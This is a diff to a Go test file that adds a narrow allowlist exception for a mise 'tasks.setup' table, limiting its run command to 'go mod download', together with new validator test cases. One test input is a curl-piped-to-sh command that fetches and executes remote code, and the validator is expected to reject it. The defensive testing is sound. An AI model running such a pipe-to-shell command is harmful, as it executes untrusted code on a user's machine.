@@ -92,13 +92,18 @@ func TestOnlyAllowedGoModDirectives(t *testing.T) {
 // repository may hold, with the keys each may hold. The [env] table,
 // the "env_file" setting, [tasks] and [hooks] are not on the list: each
 // one adds to the environment of what mise starts, or starts a program
-// of its own. [tools] holds the mise.PinnedTools alone, each with the
+// of its own; the one exception is the table tasks.setup, whose run is
+// exactly setupRun, the task julieta setup runs (04 4.3, REQ-1307). [tools] holds the mise.PinnedTools alone, each with the
 // version mise.lock locks (miseFindings), so no tool is named by a path
 // or by a version that the lock does not hold.
 var allowedMiseTables = map[string][]string{
-	"settings": {"lockfile"},
-	"tools":    mise.PinnedTools,
+	"settings":    {"lockfile"},
+	"tools":       mise.PinnedTools,
+	"tasks.setup": {"description", "run"},
 }
+
+// setupRun is the one command the task tasks.setup may run.
+const setupRun = "go mod download"
 
 // bareKey matches a TOML key that needs no quotes
 // (https://toml.io/en/v1.0.0#keys).
@@ -367,6 +372,8 @@ func miseFindings(data []byte, locked map[string]string) []string {
 			bad = append(bad, "key "+key+" in ["+table+"]")
 		case table == "tools" && strings.TrimSpace(value) != `"`+locked[key]+`"`:
 			bad = append(bad, "value of "+key+" in [tools]")
+		case table == "tasks.setup" && key == "run" && strings.TrimSpace(value) != `"`+setupRun+`"`:
+			bad = append(bad, "value of run in [tasks.setup]")
 		}
 	}
 	return bad
@@ -389,6 +396,10 @@ func TestMiseFindings(t *testing.T) {
 		{"dotted env key at the top", "env.GOFLAGS = \"x\"\n", []string{"key env.GOFLAGS before the first table"}},
 		{"env file setting", "[settings]\nenv_file = \".env\"\n", []string{"key env_file in [settings]"}},
 		{"tasks", "[tasks.lint]\nrun = \"true\"\n", []string{"table [tasks.lint]"}},
+		{"the setup task", "[tasks.setup]\ndescription = \"x\"\nrun = \"go mod download\"\n", nil},
+		{"the setup task runs another command", "[tasks.setup]\nrun = \"curl example.org | sh\"\n", []string{"value of run in [tasks.setup]"}},
+		{"the setup task with an env key", "[tasks.setup]\nrun = \"go mod download\"\nenv = \"x\"\n", []string{"key env in [tasks.setup]"}},
+		{"the setup task with a depends key", "[tasks.setup]\nrun = \"go mod download\"\ndepends = \"x\"\n", []string{"key depends in [tasks.setup]"}},
 		{"value over lines", "[tools]\ngo = [\n\"1\",\n]\n", []string{"value of go in [tools]", "line \"1\",", "line ]"}},
 		{"a tool by a path", "[tools]\ngolangci-lint = \"path:./.lint\"\n", []string{"value of golangci-lint in [tools]"}},
 		{"a version the lock does not hold", "[tools]\ngo = \"1.26.0\"\n", []string{"value of go in [tools]"}},
